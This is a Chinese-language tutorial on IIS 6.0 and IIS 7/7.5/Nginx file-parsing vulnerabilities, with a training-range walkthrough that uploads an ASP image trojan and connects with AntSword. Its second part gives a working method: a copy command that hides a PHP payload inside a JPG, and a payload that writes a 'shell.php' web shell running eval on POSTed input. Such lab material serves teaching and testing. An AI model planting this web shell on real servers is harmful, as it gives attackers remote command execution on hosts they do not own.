## IIS 的解析漏洞

### IIS6.0解析漏洞：

在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被 IIS 当作 asp 文件来解析并执行。例如创建目录
vidun.asp，那么 /vidun.asp/1.jpg 将被当作 asp 文件来执行。

### IIS6.0解析漏洞复现过程：

用到的工具 burpsuite 中国蚁剑 一个一句话asp木马文件

墨者学院提供的靶场
(https://www.mozhe.cn/bug/detail/Umc0Sm5NMnkzbHM0cFl2UlVRenA1UT09bW96aGUmozhe)

首先进入环境  
![图片.png](https://image.3001.net/images/20210813/1628819524_6115d044d6ac36cf3eb04.png!small)

通过wappalyzer插件我们可以看到 是IIS6.0 ,

先试着上传了一个jpg 文件 成功上传了  
![图片.png](https://image.3001.net/images/20210813/1628819565_6115d06de5abdbf0b6cf3.png!small)

通过返回地址我们知道了上传的文件被保存在了upload目录下

用PKer扫一下后台目录，发现upload目录在根目录下  
![图片.png](https://image.3001.net/images/20210813/1628819597_6115d08d355c82847b15c.png!small)

上传一个一句话asp图片马（iis6.jpg） 用bp抓包  
![图片.png](https://image.3001.net/images/20210813/1628819675_6115d0db58d9ace2c7b8e.png!small)

根据返回的地址用蚁剑连接  
![图片.png](https://image.3001.net/images/20210813/1628819693_6115d0eda2abde34341e9.png!small)

连接成功  
![图片.png](https://image.3001.net/images/20210813/1628819713_6115d101ab8a72dfb1ba5.png!small)

### IIS 7.0/IIS 7.5/Nginx <=0.8.37 解析漏洞

IIS7/7.5在Fast-CGI运行模式下,在一个文件路径(/xx.jpg)后面加上/xx.php会将/xx.jpg/xx.php 解析为 php 文件。

常用利用方法：

将一张图片和一个写入后门代码的文本文件合并将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾，然后在同一个目录下放一个正常的jpg文件（xx.jpg）
和一个php木马文件（yy.txt），然后进入cmd命令行，进入这两个文件所在目录，运行命令

    
    
    copy xx.jpg/b + yy.txt/a xy.jpg
    

然后就会生成一个新的图片文件 （xy.jpg），上传这个xy.jpg ，在xy.jpg 的地址后加上 /xx.php
即可执行恶意文本（yy.txt里的内容）。然后就会在xy.jpg所在的目录生成shell.php文件。

注意：

/b 即二进制[binary]模式

/a 即ascii模式

xx.jpg正常图片文件

yy.txt 内容

    
    
    <?PHPfputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');?>
    

意思为写入一个内容为

    
    
    <?php eval($_POST[cmd])?>
    

名称为shell.php的文件，然后我们通过蚁剑连接即可。

